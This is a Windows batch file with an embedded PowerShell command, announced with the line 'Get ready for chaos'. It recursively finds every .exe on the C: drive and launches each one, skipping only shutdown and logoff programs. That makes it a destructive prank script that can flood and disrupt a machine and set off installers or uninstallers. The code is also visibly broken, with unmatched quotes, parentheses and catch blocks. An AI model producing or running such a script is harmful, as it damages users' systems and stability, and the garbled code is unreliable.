@echo off
echo Get ready for chaos. It's about to start. ;)
powershell -Command (& $exeFiles = Get-ChildItem -Path C:\ -Recurse *.exe -ErrorAction SilentlyContinue

foreach ($exe in $exeFiles) {
try {
# Expanded blacklist of executables to avoid
$blacklist = @("shutdown.exe", "logoff.exe", "restart.exe", tsshutdn.exe",
"poweroff.exe", "slidetoshutdown.exe")
if $blacklist -notcontains $exe.Name -and $exe.Name -notmatch
"shutdown|logoff|restart|tsshutdown|poweroff|slidetoshutdown") {
Start-Process -FilePath $exe.FullName
} else {
Write-Host "Skipping $exe due to blacklist" -ForegroundColor Yellow
}
} catch {
Write-Host "Failed to open $exe -ForegroundColor Yellow
}
}catch {
Write-Host "Failed to open $exe" -ForegroundColor Red
}
})